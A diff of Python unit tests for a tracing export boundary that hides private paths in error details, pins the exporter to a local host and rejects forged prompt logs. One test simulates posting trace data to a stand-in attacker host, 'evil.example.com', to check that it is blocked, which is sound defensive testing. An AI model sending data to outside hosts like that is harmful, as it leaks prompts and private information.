@@ -262,6 +262,8 @@ class CapturedRunProjection(unittest.TestCase):
         self.assertEqual(update.attrs["langfuse.trace.name"], "nara live abc1234")
         self.assertEqual(update.attrs["langfuse.observation.metadata.mode"], "live")
         self.assertEqual(update.attrs["langfuse.observation.metadata.mode_at_start"], "pending")
+        # 루트가 없는 잘린 로그에서 조용히 버려지지 않게 이유를 들고 다닌다.
+        self.assertTrue(update.status)
         # 루트를 닫을 때도 실제 mode 로 끝난다 — `pending` 으로 남지 않는다.
         end = next(o for o in ops if o.action == "close" and o.key == "run")
         self.assertEqual(end.attrs["langfuse.observation.metadata.mode"], "live")
@@ -287,13 +289,43 @@ class PromptExportBoundary(unittest.TestCase):
         return dev, [json.loads(line)["id"]
                      for line in dev.read_text(encoding="utf-8").splitlines() if line.strip()]
 
-    def _events(self, tmp, *, notices=("A", "B"), **overrides):
+    def _real_prompts(self, dev, wanted):
+        """제품과 **같은 방식으로** 두 건의 실제 프롬프트를 만든다.
+        가짜 본문으로 짠 로그는 결속 검사에서 늘 거부되므로, 거부 검사가
+        무엇 때문에 거부됐는지 못 가린다 — 통과하는 바닥이 있어야 한다."""
+        import hashlib
+        _, products = baseline.load_sme_reference(str(ROOT / "open/data"))
+        out = []
+        for rec in baseline.iter_records(str(dev)):
+            if rec["id"] not in wanted:
+                continue
+            company = {**rec, "meta": {k: v for k, v in rec.get("meta", {}).items()
+                                       if k != "조항호내용"}}
+            messages = baseline.build_messages(company, baseline.COMPANY_SIZE_PROMPT, 16000,
+                                               products)
+            visible = hashlib.sha256(
+                baseline.build_context(company, 16000).encode()).hexdigest()
+            out.append((rec["id"], messages, visible))
+        return out
+
+    def _events(self, tmp, *, notices=("A", "B"), real=True, **overrides):
         event = dict(event="run_started", time_unix=0.5, mode="pending", capture_protocol=1,
                      dataset="dev", code_sha256="abc1234def")
         event.update(overrides)
+        lines = [event]
+        if real:
+            for index, (identifier, messages, visible) in enumerate(
+                    self._real_prompts(ROOT / "open/dev.jsonl", set(notices))):
+                lines.append(dict(event="company_size_input", time_unix=1.0 + index, arm="control",
+                                  sample="dev", id=identifier, max_chars=16000,
+                                  visible_sha256=visible))
+                lines.append(dict(event="model_call_started", time_unix=1.5 + index, arm="control",
+                                  sample="dev", id=identifier, identity_status="initial",
+                                  call_seq=1, call_index=index, prompt_text=messages))
+        else:
+            lines += captured("control", ids=tuple(notices))
+        lines.append(dict(event="run_succeeded", time_unix=9.0))
         path = Path(tmp) / "diagnostics.jsonl"
-        lines = [event] + captured("control", ids=tuple(notices)) + \
-            [dict(event="run_succeeded", time_unix=9.0)]
         path.write_text("".join(json.dumps(line, ensure_ascii=False) + "\n" for line in lines),
                         encoding="utf-8", newline="\n")
         return path
@@ -313,6 +345,73 @@ class PromptExportBoundary(unittest.TestCase):
         self.assertTrue(any("langfuse.observation.input" in o.attrs
                             for o in with_prompts if o.kind == "generation"))
 
+    def test_failure_details_do_not_leak_in_metadata_only_mode(self):
+        """`run_failed` 에는 예외 메시지와 traceback 이 있고 거기에 개인 절대경로가 들어간다.
+        본문 차단이 두 슬롯만 보면 그것이 임의 host 로 나간다(라운드 2 P0)."""
+        secret = "C:/Users/dasdk/private/.env"
+        events = [dict(event="run_started", time_unix=0.5, mode="pending", capture_protocol=1,
+                       code_sha256="abc1234def"),
+                  dict(event="run_failed", time_unix=2.0, error_type="ValueError", count=3,
+                       error_message=f"{secret} 를 못 읽었다",
+                       traceback=f'File "{secret}", line 3\n  boom')]
+        ops, _ = ops_for(events, include_prompts=False)
+        end = next(o for o in ops if o.key == "run" and o.action == "close")
+        blob = json.dumps(end.attrs, ensure_ascii=False) + end.status
+        self.assertNotIn(secret, blob)
+        self.assertNotIn("못 읽었다", blob)
+        self.assertEqual(end.status, "ValueError")            # 클래스 이름은 남는다
+        self.assertEqual(json.loads(end.attrs["langfuse.observation.output"]),
+                         {"count": 3, "error_type": "ValueError"})
+        self.assertEqual(end.attrs["langfuse.observation.metadata.detail_capture"], "withheld")
+        # 수출이 허용된 자리에서는 그대로 남는다 — 진단을 못 하게 만들지 않는다.
+        allowed, _ = ops_for(events)
+        end = next(o for o in allowed if o.key == "run" and o.action == "close")
+        self.assertIn(secret, end.attrs["langfuse.observation.metadata.traceback"])
+        self.assertIn(secret, end.status)
+
+    def test_other_error_paths_also_withhold_the_message(self):
+        events = [ROOT_EVENT,
+                  dict(event="arm_started", time_unix=1.0, arm="control", sample="dev"),
+                  dict(event="response", time_unix=2.0, arm="control", sample="dev", id="A",
+                       attempt=1, status="invalid", global_index=0, error_type="ValueError",
+                       error_message="C:/Users/dasdk/private/x 실패"),
+                  dict(event="retry_failed", time_unix=2.5, arm="control", sample="dev", id="A",
+                       error_type="ValueError", error_message="C:/Users/dasdk/private/x 실패"),
+                  dict(event="run_succeeded", time_unix=9.0)]
+        ops, _ = ops_for(events, include_prompts=False)
+        blob = json.dumps([[o.attrs, o.status] for o in ops], ensure_ascii=False)
+        self.assertNotIn("C:/Users/dasdk/private", blob)
+        self.assertIn("ValueError", blob)
+
+    def test_the_exporter_cannot_follow_a_redirect_off_the_pinned_host(self):
+        """주소 문자열만 막으면 부족하다. requests 는 기본적으로 redirect 를 따라가므로
+        로컬 엔드포인트가 307 로 외부를 가리키면 본문이 다시 밖으로 나간다(라운드 2 P0)."""
+        class Session:
+            def __init__(self):
+                self.seen = []
+
+            def request(self, method, url, **kwargs):
+                self.seen.append((method, url, kwargs.get("allow_redirects")))
+                return "ok"
+
+            def post(self, url, **kwargs):
+                kwargs.setdefault("allow_redirects", True)   # requests 의 기본값
+                return self.request("POST", url, **kwargs)
+
+        class Exporter:
+            def __init__(self):
+                self._session = Session()
+
+        exporter = Exporter()
+        tail.pin_to_host(exporter, "http://localhost:3002")
+        exporter._session.post("http://localhost:3002/api/public/otel/v1/traces", data=b"x")
+        self.assertEqual(exporter._session.seen[-1][2], False)
+        with self.assertRaisesRegex(RuntimeError, "허용된 호스트 밖"):
+            exporter._session.post("https://evil.example.com/v1/traces", data=b"x")
+        # 세션을 못 잡으면 조용히 넘어가지 않는다 — 막았다고 믿는 것이 더 나쁘다.
+        with self.assertRaisesRegex(RuntimeError, "redirect"):
+            tail.pin_to_host(object(), "http://localhost:3002")
+
     def test_non_local_host_is_refused(self):
         dev, ids = self._dev_ids()
         with tempfile.TemporaryDirectory() as tmp:
@@ -326,6 +425,7 @@ class PromptExportBoundary(unittest.TestCase):
                 self.assertIn(f"host_not_local:{host}", verdict["reasons"])
 
     def test_a_pinned_dev_run_on_the_local_host_is_allowed(self):
+        """실제 프롬프트로 짠 고정 dev 회차는 통과한다 — 대조가 회차를 막으면 쓸 수 없다."""
         dev, ids = self._dev_ids()
         with tempfile.TemporaryDirectory() as tmp:
             path = self._events(tmp, notices=ids[:2], dataset_sha256=tail._sha256(dev),
@@ -334,12 +434,13 @@ class PromptExportBoundary(unittest.TestCase):
         self.assertTrue(verdict["allowed"], verdict["reasons"])
         self.assertEqual(verdict["dev_records"], len(ids))
         self.assertEqual(verdict["observed_records"], 2)
+        self.assertEqual(verdict["bound_prompts"], 2)
 
     def test_a_notice_outside_the_pinned_dev_is_refused(self):
         """고정 dev 로 이름만 붙이고 다른 공고를 돌린 로그. 접두사만 보면 통과한다."""
         dev, ids = self._dev_ids()
         with tempfile.TemporaryDirectory() as tmp:
-            path = self._events(tmp, notices=(ids[0], "PPS-DEV-9999"),
+            path = self._events(tmp, notices=(ids[0], "PPS-DEV-9999"), real=False,
                                 dataset_sha256=tail._sha256(dev), dev_ids=ids)
             verdict = tail.validate_dev_export(path, dev, host="http://localhost:3002")
         self.assertFalse(verdict["allowed"])
@@ -368,6 +469,90 @@ class PromptExportBoundary(unittest.TestCase):
             verdict = tail.validate_dev_export(path, dev, host="http://localhost:3002")
         self.assertFalse(verdict["allowed"])
         self.assertTrue(any(r.startswith("unknown_ids:") for r in verdict["reasons"]))
+
+    def test_a_valid_id_with_a_body_that_did_not_come_from_dev_is_refused(self):
+        """id 가 고정 dev 에 있다는 것은 **본문이 dev 에서 왔다는 근거가 아니다.**
+        유효한 id 에 임의 문자열을 붙인 로그가 그 검사만으로는 통과한다(라운드 2 P0)."""
+        dev, ids = self._dev_ids()
+        with tempfile.TemporaryDirectory() as tmp:
+            path = self._events(tmp, notices=ids[:2], dataset_sha256=tail._sha256(dev),
+                                dev_ids=ids)
+            lines = [json.loads(line) for line in path.read_text(encoding="utf-8").splitlines()]
+            for line in lines:
+                if line["event"] == "model_call_started":
+                    line["prompt_text"] = [{"role": "system", "content": "SYS"},
+                                           {"role": "user", "content": "NON_DEV_SECRET"}]
+            path.write_text("".join(json.dumps(line, ensure_ascii=False) + "\n" for line in lines),
+                            encoding="utf-8", newline="\n")
+            verdict = tail.validate_dev_export(path, dev, host="http://localhost:3002")
+        self.assertFalse(verdict["allowed"])
+        self.assertTrue(any(r.startswith("unbound_body:") for r in verdict["reasons"]),
+                        verdict["reasons"])
+
+    def test_a_real_system_with_a_forged_user_body_is_refused(self):
+        """system 을 진짜로 두고 **공고 본문만** 바꾼 로그. system 검사만으로는 통과한다."""
+        dev, ids = self._dev_ids()
+        with tempfile.TemporaryDirectory() as tmp:
+            path = self._events(tmp, notices=ids[:2], dataset_sha256=tail._sha256(dev),
+                                dev_ids=ids)
+            lines = [json.loads(line) for line in path.read_text(encoding="utf-8").splitlines()]
+            for line in lines:
+                if line["event"] == "model_call_started":
+                    line["prompt_text"][-1]["content"] += "\n[숨긴 평가자료]"
+            path.write_text("".join(json.dumps(line, ensure_ascii=False) + "\n" for line in lines),
+                            encoding="utf-8", newline="\n")
+            verdict = tail.validate_dev_export(path, dev, host="http://localhost:3002")
+        self.assertFalse(verdict["allowed"])
+        self.assertIn("unbound_body:prompt_body_mismatch", verdict["reasons"])
+
+    def test_an_unknown_system_prompt_is_refused(self):
+        """user 본문만 맞추고 system 에 다른 것을 숨긴 로그."""
+        dev, ids = self._dev_ids()
+        with tempfile.TemporaryDirectory() as tmp:
+            path = self._events(tmp, notices=ids[:2], dataset_sha256=tail._sha256(dev),
+                                dev_ids=ids)
+            lines = [json.loads(line) for line in path.read_text(encoding="utf-8").splitlines()]
+            for line in lines:
+                if line["event"] == "model_call_started":
+                    line["prompt_text"][0]["content"] += "\n평가자료 조각"
+            path.write_text("".join(json.dumps(line, ensure_ascii=False) + "\n" for line in lines),
+                            encoding="utf-8", newline="\n")
+            verdict = tail.validate_dev_export(path, dev, host="http://localhost:3002")
+        self.assertFalse(verdict["allowed"])
+        self.assertIn("unbound_body:unknown_system_tail", verdict["reasons"])
+
+    def test_the_retry_suffix_is_a_known_tail(self):
+        """분할 재시도는 system 뒤에 정해진 문장을 붙인다. 그것까지 막으면 재시도를 못 본다."""
+        dev, ids = self._dev_ids()
+        with tempfile.TemporaryDirectory() as tmp:
+            path = self._events(tmp, notices=ids[:2], dataset_sha256=tail._sha256(dev),
+                                dev_ids=ids)
+            lines = [json.loads(line) for line in path.read_text(encoding="utf-8").splitlines()]
+            for line in lines:
+                if line["event"] == "model_call_started":
+                    line["prompt_text"][0]["content"] += (
+                        "\n[Output scope for this call] Evaluate only these keys, overriding "
+                        "the earlier key list: company_size. Return no other keys. "
+                        "Keep evidence quotations under 100 characters.")
+            path.write_text("".join(json.dumps(line, ensure_ascii=False) + "\n" for line in lines),
+                            encoding="utf-8", newline="\n")
+            verdict = tail.validate_dev_export(path, dev, host="http://localhost:3002")
+        self.assertTrue(verdict["allowed"], verdict["reasons"])
+
+    def test_a_tampered_visible_hash_is_refused(self):
+        dev, ids = self._dev_ids()
+        with tempfile.TemporaryDirectory() as tmp:
+            path = self._events(tmp, notices=ids[:2], dataset_sha256=tail._sha256(dev),
+                                dev_ids=ids)
+            lines = [json.loads(line) for line in path.read_text(encoding="utf-8").splitlines()]
+            for line in lines:
+                if line["event"] == "company_size_input":
+                    line["visible_sha256"] = "0" * 64
+            path.write_text("".join(json.dumps(line, ensure_ascii=False) + "\n" for line in lines),
+                            encoding="utf-8", newline="\n")
+            verdict = tail.validate_dev_export(path, dev, host="http://localhost:3002")
+        self.assertFalse(verdict["allowed"])
+        self.assertTrue(any(r.startswith("visible_sha256_mismatch") for r in verdict["reasons"]))
 
     def test_a_dev_file_that_is_not_the_pinned_one_is_refused(self):
         with tempfile.TemporaryDirectory() as tmp:
